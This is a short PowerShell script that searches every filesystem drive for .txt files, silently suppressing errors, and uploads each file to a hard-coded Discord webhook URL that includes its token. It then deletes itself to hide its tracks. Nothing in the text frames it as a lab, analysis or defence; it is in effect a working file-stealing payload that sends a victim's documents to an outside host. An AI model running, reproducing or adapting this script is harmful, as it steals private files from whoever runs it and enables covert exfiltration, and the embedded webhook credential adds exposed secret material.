# Discord webhook URL
$webhookUrl = "https://discord.com/api/webhooks/1243581518152990801/HeVZuyvWfQSYBl1ipXcbIEb2uIScSwlrXj6lazDoujaA741SdO4idCw8nhchRScTwinE"

# Function to upload file to Discord webhook
function Upload-FileToDiscord {
    param (
        [string]$filePath,
        [string]$webhookUrl
    )

    $fileName = [System.IO.Path]::GetFileName($filePath)
    $fileBytes = [System.IO.File]::ReadAllBytes($filePath)

    # Create multipart/form-data content
    $boundary = [System.Guid]::NewGuid().ToString()
    $LF = "`r`n"
    $bodyLines = @(
        "--$boundary",
        "Content-Disposition: form-data; name=`"file`"; filename=`"$fileName`"",
        "Content-Type: application/octet-stream",
        "",
        [System.Convert]::ToBase64String($fileBytes),
        "--$boundary--"
    )
    $body = $bodyLines -join $LF
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($body)

    # Send the request
    $webRequest = [System.Net.HttpWebRequest]::Create($webhookUrl)
    $webRequest.Method = "POST"
    $webRequest.ContentType = "multipart/form-data; boundary=$boundary"
    $webRequest.ContentLength = $bytes.Length
    $webRequestStream = $webRequest.GetRequestStream()
    $webRequestStream.Write($bytes, 0, $bytes.Length)
    $webRequestStream.Close()

    # Get the response from the server
    $webResponse = $webRequest.GetResponse()
    $webResponseStream = $webResponse.GetResponseStream()
    $reader = New-Object System.IO.StreamReader($webResponseStream)
    $responseContent = $reader.ReadToEnd()
    $reader.Close()
    $webResponseStream.Close()
    $webResponse.Close()
}

# Recursively get all .txt files from all drives
$drives = Get-PSDrive -PSProvider FileSystem
foreach ($drive in $drives) {
    Get-ChildItem -Path $drive.Root -Filter *.txt -Recurse -ErrorAction SilentlyContinue | ForEach-Object {
        Upload-FileToDiscord -filePath $_.FullName -webhookUrl $webhookUrl
    }
}

# Remove the PowerShell script file after execution
$scriptPath = $MyInvocation.MyCommand.Definition
Remove-Item -Path $scriptPath -Force
